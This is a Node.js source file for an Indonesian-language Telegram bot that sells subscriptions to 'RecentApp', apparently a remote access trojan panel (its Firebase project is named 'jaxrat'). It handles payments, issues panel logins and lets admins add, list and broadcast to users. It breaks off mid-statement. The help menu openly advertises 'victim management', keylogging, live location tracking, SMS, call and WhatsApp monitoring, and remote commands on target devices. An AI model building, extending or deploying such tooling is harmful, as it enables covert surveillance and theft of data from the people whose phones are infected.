const TelegramBot = require('node-telegram-bot-api');
const QRCode = require('qrcode');
const admin = require('firebase-admin');
const config = require('./config');
const express = require('express');
const app = express();

// Initialize Firebase Admin
admin.initializeApp({
    credential: admin.credential.cert({
        projectId: config.firebaseConfig.projectId,
        clientEmail: "firebase-adminsdk@jaxrat-6813c.iam.gserviceaccount.com",
        // You need to download service account key from Firebase Console
        // Save as serviceAccountKey.json
    }),
    databaseURL: config.firebaseConfig.databaseURL
});

const db = admin.database();

// Initialize Bot
const bot = new TelegramBot(config.botToken, { polling: true });

// Store user states
const userState = {};

// Helper function to check if user is admin
function isAdmin(chatId) {
    return config.admins.includes(chatId.toString());
}

// Helper function to check if user is owner
function isOwner(chatId) {
    return chatId.toString() === config.ownerChatId;
}

// Start command
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const firstName = msg.from.first_name || 'User';
    
    const welcomeMessage = `
🎉 *Selamat datang di RecentApp Bot, ${firstName}!*

Bot ini adalah sistem manajemen untuk aplikasi monitoring RecentApp.

🔹 *Harga Akses:* Rp ${config.accessPrice.toLocaleString()}
🔹 *Pembayaran:* QRIS / Bank Transfer
🔹 *Fitur:* Akses ke panel admin, command center, dan victim management

Silakan pilih menu di bawah:
    `;
    
    const keyboard = {
        reply_markup: {
            keyboard: [
                ['💳 Beli Akses', '🔑 Cek Status'],
                ['📞 Kontak Owner', '❓ Bantuan']
            ],
            resize_keyboard: true
        }
    };
    
    await bot.sendMessage(chatId, welcomeMessage, { 
        parse_mode: 'Markdown',
        ...keyboard 
    });
});

// Handle "Beli Akses"
bot.onText(/💳 Beli Akses/, async (msg) => {
    const chatId = msg.chat.id;
    
    // Check if user already has access
    const userRef = db.ref(`users/${chatId}`);
    const userSnapshot = await userRef.once('value');
    const userData = userSnapshot.val();
    
    if (userData && userData.hasAccess && userData.accessUntil > Date.now()) {
        await bot.sendMessage(chatId, 
            '✅ *Kamu sudah memiliki akses aktif!*\n\n' +
            `Berlaku sampai: ${new Date(userData.accessUntil).toLocaleString('id-ID')}\n\n` +
            'Gunakan /panel untuk mengakses dashboard.',
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    // Generate payment QR
    const paymentData = {
        id: `RECENTAPP-${chatId}-${Date.now()}`,
        amount: config.accessPrice,
        method: 'QRIS',
        timestamp: Date.now()
    };
    
    try {
        // Generate QR Code (simulated - in production, integrate with payment gateway)
        const qrData = JSON.stringify(paymentData);
        const qrImage = await QRCode.toDataURL(qrData);
        
        // Send QR code
        await bot.sendPhoto(chatId, Buffer.from(qrImage.split(',')[1], 'base64'), {
            caption: `
💳 *Pembayaran QRIS*

ID: \`${paymentData.id}\`
Harga: Rp ${paymentData.amount.toLocaleString()}

*Cara Pembayaran:*
1. Scan QR code di atas
2. Lakukan pembayaran Rp ${paymentData.amount.toLocaleString()}
3. Kirim bukti transfer ke @${config.ownerUsername}
4. Dapatkan akses dalam 5-10 menit

Atau transfer manual:
Bank BCA: 1234567890 a.n RecentApp
Mandiri: 0987654321 a.n RecentApp
            `,
            parse_mode: 'Markdown'
        });
        
        // Save pending payment
        await db.ref(`payments/${paymentData.id}`).set({
            chatId: chatId,
            username: msg.from.username,
            amount: paymentData.amount,
            status: 'pending',
            timestamp: paymentData.timestamp
        });
        
    } catch (error) {
        console.error('QR Generation Error:', error);
        await bot.sendMessage(chatId, 'Gagal generate QR. Silakan hubungi owner langsung.');
    }
});

// Handle "Cek Status"
bot.onText(/🔑 Cek Status/, async (msg) => {
    const chatId = msg.chat.id;
    
    const userRef = db.ref(`users/${chatId}`);
    const snapshot = await userRef.once('value');
    const userData = snapshot.val();
    
    if (userData && userData.hasAccess) {
        const expiryDate = new Date(userData.accessUntil).toLocaleString('id-ID');
        await bot.sendMessage(chatId, 
            `✅ *Status: AKTIF*\n\n` +
            `📅 Berlaku sampai: ${expiryDate}\n` +
            `📱 Devices: ${userData.devices || 0}\n` +
            `🔗 Panel: https://recentapp-panel.vercel.app\n\n` +
            `Gunakan email: ${userData.email}\n` +
            `Password: ${userData.password || 'sudah direset'}`,
            { parse_mode: 'Markdown' }
        );
    } else {
        await bot.sendMessage(chatId, 
            '❌ *Status: TIDAK AKTIF*\n\n' +
            'Kamu belum memiliki akses atau akses sudah expired.\n' +
            'Silakan beli akses melalui menu 💳 Beli Akses',
            { parse_mode: 'Markdown' }
        );
    }
});

// Handle "Kontak Owner"
bot.onText(/📞 Kontak Owner/, async (msg) => {
    const chatId = msg.chat.id;
    
    await bot.sendMessage(chatId,
        `📞 *Kontak Owner*\n\n` +
        `Owner: @${config.ownerUsername}\n` +
        `Group: ${config.groupLink}\n\n` +
        `Untuk pembelian, laporan error, atau pertanyaan lainnya.`,
        { parse_mode: 'Markdown' }
    );
});

// Handle "Bantuan"
bot.onText(/❓ Bantuan/, async (msg) => {
    const chatId = msg.chat.id;
    
    await bot.sendMessage(chatId,
        `❓ *Bantuan RecentApp Bot*\n\n` +
        `*Commands:*\n` +
        `/start - Mulai bot\n` +
        `/panel - Dapatkan link panel\n` +
        `/adduser - [ADMIN] Tambah user\n` +
        `/removeuser - [ADMIN] Hapus user\n` +
        `/listusers - [ADMIN] Lihat semua user\n` +
        `/broadcast - [OWNER] Kirim pesan ke semua user\n` +
        `/stats - [OWNER] Statistik sistem\n\n` +
        `*Fitur:*\n` +
        `• Monitoring device real-time\n` +
        `• Live location tracking\n` +
        `• Call & SMS logs\n` +
        `• WhatsApp monitoring\n` +
        `• Keylogger\n` +
        `• Remote commands\n` +
        `• File manager\n\n` +
        `Butuh bantuan? Hubungi @${config.ownerUsername}`,
        { parse_mode: 'Markdown' }
    );
});

// Admin command: Add user
bot.onText(/\/adduser (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isAdmin(chatId) && !isOwner(chatId)) {
        await bot.sendMessage(chatId, '❌ Anda tidak memiliki akses ke command ini.');
        return;
    }
    
    const params = match[1].split(' ');
    if (params.length < 2) {
        await bot.sendMessage(chatId, 'Format: /adduser [chat_id] [days]');
        return;
    }
    
    const targetChatId = params[0];
    const days = parseInt(params[1]);
    
    const accessUntil = Date.now() + (days * 24 * 60 * 60 * 1000);
    
    // Generate random credentials
    const email = `user${Math.floor(Math.random() * 10000)}@recentapp.com`;
    const password = Math.random().toString(36).substring(2, 10);
    
    await db.ref(`users/${targetChatId}`).set({
        hasAccess: true,
        accessUntil: accessUntil,
        email: email,
        password: password,
        devices: 0,
        addedBy: chatId,
        addedAt: Date.now()
    });
    
    await bot.sendMessage(chatId, 
        `✅ *User berhasil ditambahkan!*\n\n` +
        `Chat ID: ${targetChatId}\n` +
        `Durasi: ${days} hari\n` +
        `Berlaku sampai: ${new Date(accessUntil).toLocaleString('id-ID')}\n\n` +
        `Credentials:\n` +
        `Email: \`${email}\`\n` +
        `Password: \`${password}\``,
        { parse_mode: 'Markdown' }
    );
    
    // Notify user
    try {
        await bot.sendMessage(targetChatId,
            `🎉 *Selamat! Akses Anda telah diaktifkan!*\n\n` +
            `Durasi: ${days} hari\n` +
            `Berlaku sampai: ${new Date(accessUntil).toLocaleString('id-ID')}\n\n` +
            `Panel: https://recentapp-panel.vercel.app\n` +
            `Email: \`${email}\`\n` +
            `Password: \`${password}\`\n\n` +
            `Gunakan credentials di atas untuk login ke panel.`,
            { parse_mode: 'Markdown' }
        );
    } catch (error) {
        console.error('Error notifying user:', error);
    }
});

// Admin command: List users
bot.onText(/\/listusers/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAdmin(chatId) && !isOwner(chatId)) {
        await bot.sendMessage(chatId, '❌ Anda tidak memiliki akses ke command ini.');
        return;
    }
    
    const usersRef = db.ref('users');
    const snapshot = await usersRef.once('value');
    const users = snapshot.val() || {};
    
    let message = '📋 *Daftar Users:*\n\n';
    let activeCount = 0;
    
    Object.keys(users).forEach(uid => {
        const user = users[uid];
        const status = user.hasAccess && user.accessUntil > Date.now() ? '✅' : '❌';
        if (user.hasAccess && user.accessUntil > Date.now()) activeCount++;
        
        message += `${status} \`${uid}\`\n`;
        message += `   Devices: ${user.devices || 0}\n`;
        message += `   Exp: ${new Date(user.accessUntil).toLocaleDateString('id-ID')}\n\n`;
    });
    
    message += `Total: ${Object.keys(users).length} users\n`;
    message += `Aktif: ${activeCount} users`;
    
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// Owner command: Broadcast
bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!isOwner(chatId)) {
        await bot.sendMessage(chatId, '❌ Hanya owner yang bisa menggunakan command ini.');
        return;
    }
    
    const broadcastMessage = match[1];
    
    const usersRef = db.ref('users');
    const snapshot = await usersRef.once('value');
    const users = snapshot.val() || {};
    
    let sent = 0;
    let failed = 0;
    
    await bot.sendMessage(chatId, `📢 Mengirim broadcast ke ${Object.keys(users).length} users...`);
    
    for (const uid of Object.keys(users)) {
        try {
            await bot.sendMessage(uid, 
                `📢 *Broadcast dari Owner:*\n\n${broadcastMessage}`,
                { parse_mode: 'Markdown' }
            );
            sent++;
        } catch (error) {
            failed++;
        }
        // Delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    await bot.sendMessage(chatId, 
        `✅ *Broadcast selesai!*\n\n` +
        `Terkirim: ${sent}\n` +
        `Gagal: ${failed}`,
        { parse_mode: 'Markdown' }
    );
});

// Owner command: Stats
bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!isOwner(chatId)) {
        await bot.sendMessage(chatId, '❌ Hanya owner yang bisa menggunakan command ini.');
        return;
    }
    
    // Get users stats
    const usersRef = db.ref('users');
    const usersSnapshot = await usersRef.once('value');
    const
